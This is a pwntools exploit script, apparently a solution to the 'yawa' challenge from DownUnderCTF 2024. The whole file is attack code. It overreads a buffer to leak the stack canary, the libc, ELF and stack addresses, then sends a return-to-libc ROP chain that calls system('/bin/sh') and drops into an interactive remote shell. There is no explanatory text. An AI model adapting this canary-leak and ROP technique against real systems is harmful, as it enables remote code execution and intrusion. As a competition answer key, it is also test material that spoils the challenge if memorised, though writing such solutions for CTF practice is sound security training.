#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './yawa' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '2024.ductf.dev', 30010 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x131d
# breakrva 0x12fa
break *main+141
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================
def scanf(data: bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendline(data)

def read():
    io.sendlineafter(b'> ', b'2')

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)
    
    # leak canary
    offset = 88
    payload = flat({
        offset: [
        ]
    })
    scanf(payload)
    read()
    io.recvline()
    canaryBytes = io.recv(7)
    canary = unpack(canaryBytes.rjust(8, b'\x00'))
    
    # leak libc
    payload = flat({
        offset: [
            b'\x01' * 15
        ]
    })
    scanf(payload)
    read()
    io.recvline()
    libc.address = unpack(io.recv(6).ljust(8, b'\x00')) - 0x29d90
    
    # leak elf base 0x12b1
    payload = flat({
        offset: [
            b'\x01' * 31
        ]
    })
    scanf(payload)
    read()
    io.recvline()
    elf.address = unpack(io.recvline()[-7:].strip().ljust(8, b'\x00')) - 0x12b1
    
    # leak stack
    payload = flat({
        offset: [
            b'\x02' * 47
        ]
    })
    scanf(payload)
    read()
    io.recvline()
    RSP = unpack(io.recvline()[-7:].strip().ljust(8, b'\x00')) - 0x178
    
    payload = flat(
        b'\x90' * 88,
        canary,
        RSP,
        rop.rdi.address + libc.address,
        next(libc.search(b'/bin/sh\x00')),
        rop.ret.address + libc.address,
        libc.sym.system
    )
    
    scanf(payload)
    io.sendline(b'3')
    
    info(f'Elf base at {hex(elf.address)}')
    info(f'len payload {len(payload)}')    
    info(f'Libc base: {hex(libc.address)}')
    info(f'canary {hex(canary)}')

    io.interactive()
    
if __name__ == '__main__':
    exploit()